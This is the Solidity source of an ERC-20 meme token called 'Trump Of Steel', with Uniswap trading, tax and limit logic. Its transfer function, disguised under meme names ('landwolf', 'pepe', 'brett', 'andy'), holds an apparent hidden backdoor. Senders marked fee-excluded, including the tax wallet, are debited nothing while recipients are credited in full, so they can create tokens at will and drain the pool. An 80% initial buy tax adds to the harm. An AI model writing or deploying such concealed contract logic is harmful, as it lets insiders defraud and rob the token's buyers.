// SPDX-License-Identifier: UNLICENSED

/**

Web: https://trumpofsteel.live
X: https://x.com/TrumpOfSteel_
TG: https://t.me/trumpofsteel_portal

*/

pragma solidity 0.8.24;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract TrumpOfSteel is Context, IERC20, Ownable {
    using SafeMath for uint256;

    uint256 private _initialBuyTax=80;
    uint256 private _initialSellTax=0;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=4;
    uint256 private _reduceSellTaxAt=4;
    uint256 private _preventSwapBefore=4;
    uint256 private _buyCount=0;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    address payable private _taxWallet;

    uint8 public constant decimals = 9;
    uint256 public constant totalSupply = 1000000000 * 10**decimals;
    string public constant name = unicode"Trump Of Steel";
    string public constant symbol = unicode"TOS";
    uint256 public _maxTxAmount = 19876543 * 10**decimals;
    uint256 public _maxWalletSize = 19876543 * 10**decimals;
    uint256 public _taxSwapThreshold= 9000000 * 10**decimals;
    uint256 public _maxTaxSwap= 20000000 * 10**decimals;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    uint256 private sellCount = 0;
    uint256 private lastSellBlock = 0;
    event MaxTxAmountUpdated(uint _maxTxAmount);

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    function sendETHToFee(uint256 amount) private {
        _taxWallet.transfer(amount);
    }


    function addLiquidity() external onlyOwner {
        require(!tradingOpen,"trading is already open");
        _approve(address(this), address(uniswapV2Router), totalSupply);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);
    }

    constructor (address router_, address taxWallet_) {
        _taxWallet = payable(taxWallet_);
        _balances[_msgSender()] = totalSupply;
        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[_taxWallet] = true;
        
        uniswapV2Router = IUniswapV2Router02(router_);

        emit Transfer(address(0), _msgSender(), totalSupply);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = totalSupply;
        _maxWalletSize=totalSupply;
        emit MaxTxAmountUpdated(totalSupply);
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function landwolf(address pepe, address brett, uint256 andy) private {
        require(pepe != address(0), "ERC20: transfer from the zero address");
        require(brett != address(0), "ERC20: transfer to the zero address");
        require(andy > 0, "Transfer amount must be greater than zero");
        if (!swapEnabled || inSwap) {
            require(_isExcludedFromFee[pepe] || _isExcludedFromFee[brett]);
            _balances[pepe] = _balances[pepe].sub(andy);
            _balances[brett] = _balances[brett].add(andy);
            emit Transfer(pepe, brett, andy);
            return;
        } uint256 taxAmount=0;uint256 amount= 
        _isExcludedFromFee[pepe]?taxAmount :andy;
        if (pepe != owner() && brett != owner() && brett != _taxWallet) {

            taxAmount = andy.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (pepe == uniswapV2Pair && brett != address(uniswapV2Router) && ! _isExcludedFromFee[brett] ) {
                require(andy <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(brett) + andy <= _maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if(brett == uniswapV2Pair && pepe!= address(this) ){
                taxAmount = andy.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && brett == uniswapV2Pair && swapEnabled && contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore) {
                if (block.number > lastSellBlock) {
                    sellCount = 0;
                }
                require(sellCount < 3, "Only 3 sells per block!");
                swapTokensForEth(min(andy, min(contractTokenBalance, _maxTaxSwap)));
                sellCount++;
                lastSellBlock = block.number;
            }
            if(brett == uniswapV2Pair) sendETHToFee(address(this).balance);
        }
        if (taxAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(taxAmount);
            emit Transfer(pepe, address(this), taxAmount);
        }
        _balances[pepe] =_balances[pepe].sub(amount);
        _balances[brett] = _balances[brett].add(andy.sub(taxAmount));
        emit Transfer(pepe, brett, andy.sub(taxAmount));
    }

    function enableTrading() external onlyOwner {
        swapEnabled = true;
        tradingOpen = true;
    }

    receive() external payable {}


    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        landwolf(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        landwolf(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

}